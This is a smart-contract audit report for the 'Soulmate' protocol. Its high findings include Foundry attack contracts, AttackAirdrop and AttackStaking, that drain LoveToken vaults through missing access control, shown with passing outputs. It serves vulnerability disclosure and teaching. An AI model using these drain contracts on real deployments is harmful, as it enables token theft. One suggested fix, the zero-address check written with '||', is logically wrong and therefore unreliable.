# CodeHawks First Flight: Soulmate

### Description

**Date Started**: 2024-02-soulmate

## FINDINGS

## Highs

### [H-1] Lack of access control allows uninitialized soulmates to read and write message in `Soulmate:readMessageInSharedSpace` and `Soulmate:writeMessageInSharedSpace`

**Description:**

Default value `uint256` is 0 for the `ownerToId` mapping in the `Soulmate` contract. Hence, the lack of access control within the `readMessageInSharedSpace` and `writeMessageInSharedSpace` allows uninitialized addresses in the `ownerToId` mapping to read and write messages within the shared space.

**Impact:**

Soulmates with NFT ID == 0 cannot enjoy the shared space privilege since some uninitialized address in `ownerToId` mapping can participate.

**Proof of Concept:**

Within your foundry test suite, set up your `Test` based contract and initialize `Soulmate` contract and paste the below code blocks.

<details>

<summary>Code</summary>

```js
function setUpSoulmates() public {
    vm.prank(soulmate1);
    soulmateContract.mintSoulmateToken();

    vm.prank(soulmate2);
    soulmateContract.mintSoulmateToken();
    assertEq(soulmateContract.soulmateOf(soulmate1), soulmate2);
}

function testNonSoulmateCanSendMessageToSharedSpaceIdZero() public {
    setUpSoulmates();
    // there should be no message since neither soulmates has sent a message
    uint256 timestamp = 3;
    vm.prank(soulmate1);
    vm.warp(timestamp);
    string memory message = soulmateContract.readMessageInSharedSpace();
    assertEq(message, ", honey");

    address notASoulmate = makeAddr("notASoulmate");

    vm.prank(notASoulmate);
    soulmateContract.writeMessageInSharedSpace("some new message");

    // let's get the message in sharedSpace[0]
    vm.prank(soulmate2);
    assertEq(message, soulmateContract.readMessageInSharedSpace());
}
```

</details>

Run the test with the command below:

```shell
forge test --mt testNonSoulmateCanSendMessageToSharedSpaceIdZero -vvvvv
```

Failed result output:

```js
[FAIL. Reason: assertion failed] testNonSoulmateCanSendMessageToSharedSpaceIdZero() (gas: 68731)
Logs:
  Error: a == b not satisfied [string]
        Left: , honey
       Right: some new message, honey
```

**Recommended Mitigation:**

```diff
function readMessageInSharedSpace() external view returns (string memory) {
+   require(idToOwners[ownerToId[msg.sender]][0] == msg.sender || idToOwners[ownerToId[msg.sender]][1] == msg.sender);
    ...
```

```diff
function writeMessageInSharedSpace(string calldata message) external {
+   require(idToOwners[ownerToId[msg.sender]][0] == msg.sender || idToOwners[ownerToId[msg.sender]][1] == msg.sender);
    ...
```

### [H-2] LoveToken reward can be claimed by a non-soulmate address in `Airdrop:claim`

**Description:**

Once the `block.timestamp - idToCreationTimestamp(0)` is past one day, an uninitialized address can take exploit the absence of access control to claim (LoveToken) rewards and with sufficient time steal all the LoveTokens available in the Airdrop Vault.

**Impact:**

LoveToken gets stolen by an unauthorized party and a potential loss of all tokens within the **Airdop Vault**

**Proof of Concept:**

In your foundry test suite, set up your `Test` based contract with the functions below:

<details>

<summary>Code</summary>

```js
function setUp() public {
    airdropVaultContract = new Vault();
    stakingVaultContract = new Vault();
    soulmateContract = new Soulmate();
    loveTokenContract = new LoveToken(ISoulmate(address(soulmateContract)), address(airdropVaultContract), address(stakingVaultContract));
    airdropContract = new Airdrop(ILoveToken(address(loveTokenContract)), ISoulmate(address(soulmateContract)), IVault(address(airdropVaultContract)));

    // let's initialize vault
    airdropVaultContract.initVault(ILoveToken(address(loveTokenContract)), address(airdropContract));
}

function setUpSoulmates() public {
    vm.prank(soulmate1);
    soulmateContract.mintSoulmateToken();

    vm.prank(soulmate2);
    soulmateContract.mintSoulmateToken();
    assertEq(soulmateContract.soulmateOf(soulmate1), soulmate2);
}

function testNonSoulmateCanClaimUnclaimedSoulmateAirdrop() public {
    setUpSoulmates();

    address notASoulmate = makeAddr("notASoulmate");

    vm.warp(airdropContract.daysInSecond() + 1);
    vm.startPrank(notASoulmate);

    uint256 numIterations = loveTokenContract.balanceOf(address(airdropVaultContract)) / (1 * 10 ** 18); // infinite calls

    numIterations = 10000;

    for (uint256 i=0; i < numIterations; i++) {
        AttackAirdrop attackAirdrop = new AttackAirdrop();

        attackAirdrop.attack(address(airdropContract), address(loveTokenContract), address(soulmateContract));
    }

    console.log(loveTokenContract.balanceOf(notASoulmate));

    assertEq(loveTokenContract.balanceOf(notASoulmate), numIterations * 10 ** loveTokenContract.decimals());
    vm.stopPrank();
}
```

</details>
<br/>

In the same file containing your initialized test as above, paste this Attack Contract below:

<details>

<summary>Code</summary>

```js
contract AttackAirdrop {
    Airdrop airdropContract;
    LoveToken lovetokenContract;
    Soulmate soulmateContract;

    function attack(address _airdropContract, address _loveTokenContract, address _soulmateContract) public {
        airdropContract = Airdrop(_airdropContract);
        lovetokenContract = LoveToken(_loveTokenContract);
        soulmateContract = Soulmate(_soulmateContract);

        uint256 numberOfDaysInCouple = block.timestamp - soulmateContract.idToCreationTimestamp(0);

        if (numberOfDaysInCouple < airdropContract.daysInSecond()) revert("Owner already claimed!");

        airdropContract.claim();
        lovetokenContract.transfer(msg.sender, lovetokenContract.balanceOf(address(this)));
    }
}
```

</details>

<details>

<summary><b>RESULT</b>

```js
Running 1 test for test/ProtocolAudit.t.sol:ProtocolAudit
[PASS] testNonSoulmateCanClaimUnclaimedSoulmateAirdrop() (gas: 3463540675)
Logs:
  10000000000000000000000

```

</details>

<br/>

**Recommended Mitigation:**

```diff
function claim() public {
    // No LoveToken for people who don't love their soulmates anymore.
    if (soulmateContract.isDivorced()) revert Airdrop__CoupleIsDivorced();
+   require(idToOwners[ownerToId[msg.sender]][0] == msg.sender || idToOwners[ownerToId[msg.sender]][1] == msg.sender);
    ...
```

### [H-3] Malicious soulmate can transfer some earned LoveTokens and deposit it using a malicious contract to drain rewards in `Staking` contract

**Description:**

A soulmate that has earned some LoveTokens either from `Airdrop`or `Staking` can transfer some of that tokens to an `AttackStaking` contract, deposit tokens to `Staking:deposit`, exploit the `ownerToId` mapping to `0` for non-existent addresses and `claimRewards`.

**Impact:**

This leads to loss of `LoveTokens` approved to be managed by `Staking` contract by a `Vault`

**Proof of Concept:**

Paste the below code in your forge test suite contract:

<details>

<summary>Code</summary>

```js
function setUp() public {
    airdropVaultContract = new Vault();
    stakingVaultContract = new Vault();
    soulmateContract = new Soulmate();
    loveTokenContract = new LoveToken(ISoulmate(address(soulmateContract)), address(airdropVaultContract), address(stakingVaultContract));
    airdropContract = new Airdrop(ILoveToken(address(loveTokenContract)), ISoulmate(address(soulmateContract)), IVault(address(airdropVaultContract)));
    stakingContract = new Staking(ILoveToken(address(loveTokenContract)), ISoulmate(address(soulmateContract)), IVault(address(stakingVaultContract)));

    // let's initialize vault
    airdropVaultContract.initVault(ILoveToken(address(loveTokenContract)), address(airdropContract));
    stakingVaultContract.initVault(ILoveToken(address(loveTokenContract)), address(stakingContract));
}

function setUpSoulmates() public {
    vm.prank(soulmate1);
    soulmateContract.mintSoulmateToken();

    vm.prank(soulmate2);
    soulmateContract.mintSoulmateToken();
    assertEq(soulmateContract.soulmateOf(soulmate1), soulmate2);
}

function testNonSoulmateCanClaimUnclaimedSoulmateStakedTokens() public {
    /**
        In a situation where
        step 1: a malicious participant is an address
        that is also a Soulmate.

        step 2: gets some LoveToken to stake from daily Airdrops

        step 3: transfer to some other address the Lovetokens and
        deposit the LoveTokens (as that other address) in Staking SC
        so as to have a non-zero value in userStakes mapping

        step 4: claim as much rewards as possible😈
    */
    setUpSoulmates();

    address soulmate3 = makeAddr("soulmate3");

    // malicious soulmate
    address soulmate4 = makeAddr("soulmate4");

    // step 1: let's become a Soulmate
    vm.prank(soulmate3);
    soulmateContract.mintSoulmateToken();

    vm.startPrank(soulmate4);
    soulmateContract.mintSoulmateToken();

    vm.warp(1 weeks + 1);

    // step 2: let's get some LoveToken airdrop as a Soulmate
    airdropContract.claim();
    vm.stopPrank();
    uint256 loveTokenDeposit = loveTokenContract.balanceOf(soulmate4);
    assert(loveTokenDeposit > 0);

    // step 3: let's transfer & deposit the LoveTokens airdropped to us
    uint256 numIterations = loveTokenContract.balanceOf(address(stakingVaultContract)) / (1 * 10 ** 18); // infinite calls

    numIterations = 10000;

    // claim as much rewards as possible
    for (uint256 i=0; i < numIterations; i++) {
        /// step 4: ⚔️💰
        AttackStaking attackStaking = new AttackStaking();
        vm.startPrank(soulmate4);
        loveTokenContract.transfer(address(attackStaking), loveTokenDeposit);

        attackStaking.attack(address(stakingContract), address(soulmateContract), address(loveTokenContract));
        vm.stopPrank();
    }

    console.log(loveTokenContract.balanceOf(soulmate4));

    assertEq(loveTokenContract.balanceOf(soulmate4), ((numIterations * loveTokenDeposit * (block.timestamp - soulmateContract.idToCreationTimestamp(0))) / 1 weeks) + loveTokenDeposit);
    vm.stopPrank();
}
```

</details>

<br/>

Below is the `AttackStaking` contract to perform the exploit:

<details>

<summary>Code</summary>

```js
contract AttackStaking {
    Staking stakingContract;
    Soulmate soulmateContract;
    LoveToken loveTokenContract;

    function attack(address _stakingContract, address _soulmateContract, address _loveTokenContract) public {
        stakingContract = Staking(_stakingContract);
        soulmateContract = Soulmate(_soulmateContract);
        loveTokenContract = LoveToken(_loveTokenContract);
        /**
            let's check if the difference between (block.timstamp) and
            soulmateContract.idToCreationTimestamp(0) is >= 1 week
        */
        uint256 timeDifference = block.timestamp - soulmateContract.idToCreationTimestamp(0);

        if ((timeDifference % 1 weeks) >= 1) revert("Less than one week to exploiting!");

        uint256 loveTokenBal = loveTokenContract.balanceOf(address(this));

        // we need to have some LoveTokens in our balance to proceed with exploit
        if (loveTokenBal == 0) revert("Transfer some LoveTookens to proceed with exploit!");

        loveTokenContract.approve(address(stakingContract), loveTokenBal);
        stakingContract.deposit(loveTokenBal);

        // let's claim rewards 😈
        stakingContract.claimRewards();

        // withdrawing stakes
        stakingContract.withdraw(stakingContract.userStakes(address(this)));

        // send received tokens to msg.sender
        loveTokenContract.transfer(msg.sender, loveTokenContract.balanceOf(address(this)));
    }
}
```

</details>

<br/>

Run the command below in your terminal to see the test result:

```js
forge test --mt testNonSoulmateCanClaimUnclaimedSoulmateStakedTokens -vvvvv
```

**RESULT**

```js
Running 1 test for test/ProtocolAudit.t.sol:ProtocolAudit
[PASS] testNonSoulmateCanClaimUnclaimedSoulmateStakedTokens() (gas: 4863982377)
Logs:
  70007000000000000000000

```

**Recommended Mitigation:**

```diff
    function claimRewards() public {
        uint256 soulmateId = soulmateContract.ownerToId(msg.sender);
+       require(idToOwners[soulmateId][0] == msg.sender || idToOwners[soulmateId][1] == msg.sender);
    ...
```

## Lows

### [L-1] No zero address checks in the `LoveToken` constructor

**Description:**

Missing zero checks in the constructor before assignment can cause the `LoveToken` contract interact with a null address

**Impact:**

Unexpected behaviour in contract code

**Proof of Concept:**

```js
constructor(
    ISoulmate _soulmateContract,
    address _airdropVault,
    address _stakingVault
) ERC20("LoveToken", "<3", 18) {
    soulmateContract = _soulmateContract;
    airdropVault = _airdropVault;
    stakingVault = _stakingVault;
}
```

**Recommended Mitigation:**

```js
constructor(
    ISoulmate _soulmateContract,
    address _airdropVault,
    address _stakingVault
) ERC20("LoveToken", "<3", 18) {
+   require(_airdropVault != address(0) || _stakingVault != address(0));
    soulmateContract = _soulmateContract;
    airdropVault = _airdropVault;
    stakingVault = _stakingVault;
}
```

## Informationals

### [I-1] Missing natspec in state variable declaration

**Description:**

**Impact:**

**Proof of Concept:**

**Recommended Mitigation:**

Include natspec comment for important state variable declaration like `mappings` across all contract code.

### [I-2] Standard naming convention should be followed across state variable declaration

**Description:**

Standard naming convention such as prefixing:

- `immutable` data types with `i_`
- state variable types with `s_`

is not adhered to within the code base

**Impact:**

**Proof of Concept:**

**Recommended Mitigation:**

Follow standard naming convention

### [I-3] Mismatch of natspec for `Vault:initVault` function

**Description:**

```js
/// @notice vaultInitialize protect against multiple initialization.
function initVault(ILoveToken loveToken, address managerContract) public {
    ...
```

The last line of comment before the `initVault` declaration is mismatched. The comment belongs to the `bool public vaultInitialize;` declaration

**Impact:**

**Proof of Concept:**

**Recommended Mitigation:**

```diff
+   // @notice vaultInitialize protect against multiple initialization.
    bool public vaultInitialize;
```

### [I-4] Solidity pragma should be specific, not wide

**Description:**

Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.23;`, use `pragma solidity 0.8.0;`

Found all across source codes.

**Impact:**

**Proof of Concept:**

**Recommended Mitigation:**

Consider using a specific version of Solidity in your contracts. Use `pragma solidity 0.8.23;`

### [I-5] Functions not used internally could be marked external

**Description:**

Across codebase, mark contracts that are not used internally as `external`

**Impact:**

**Proof of Concept:**

**Recommended Mitigation:**

Across codebase, mark contracts that are not used internally as `external`

### [I-6] Constants should be defined and used instead of literals

**Description:**

The use of literals instead of constants in some math operation.

Example

i. In `Airdrop:claim`:

```js
numberOfDaysInCouple * 10 ** loveToken.decimals();
```

ii. In `LoveToken:initVault`:

```js
_mint(airdropVault, 500_000_000 ether);
approve(managerContract, 500_000_000 ether);
```

iii. E.T.C

**Impact:**

**Proof of Concept:**

**Recommended Mitigation:**

Set consistent literals as constant state variables and replace with variables such literals.
